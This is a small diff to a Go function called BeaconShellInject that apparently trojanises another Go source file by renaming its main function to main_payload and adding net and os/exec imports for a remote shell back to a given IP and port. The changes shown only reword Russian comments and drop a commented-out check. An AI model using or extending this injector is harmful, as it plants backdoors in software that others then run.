@@ -33,12 +33,12 @@ func BeaconShellInject(file_path, shell_type, OS, Arch, ip string, port int) {
 			line = strings.Replace(line, "func main", "func main_payload", 1)
 		}
 
-		// Проверяем, начинаем ли мы секцию импорта
+		// Поиск начала секции импорта
 		if strings.HasPrefix(line, "import (") {
 			isImportSection = true
 		}
 
-		// Если мы находимся в секции импорта, собираем импорты
+		// Если изучается секция импорта, считать импорт
 		if isImportSection {
 			if strings.TrimSpace(line) == ")" {
 				isImportSection = false
@@ -50,13 +50,6 @@ func BeaconShellInject(file_path, shell_type, OS, Arch, ip string, port int) {
 		lines = append(lines, line)
 	}
 
-	/*
-		if err := scanner.Err(); err != nil {
-			fmt.Println("Scanning error!")
-			return
-		}
-	*/
-
 	// Проверка и добавление необходимых импортов
 	requiredImports := []string{"\"io\"", "\"net\"", "\"os/exec\""}
 	for _, reqImport := range requiredImports {
@@ -65,7 +58,7 @@ func BeaconShellInject(file_path, shell_type, OS, Arch, ip string, port int) {
 		}
 	}
 
-	// Обновляем секцию импорта в строках
+	// Обновление секции импорта
 	if len(new_imports) > 0 {
 		lines = updateImports(lines, new_imports)
 	}
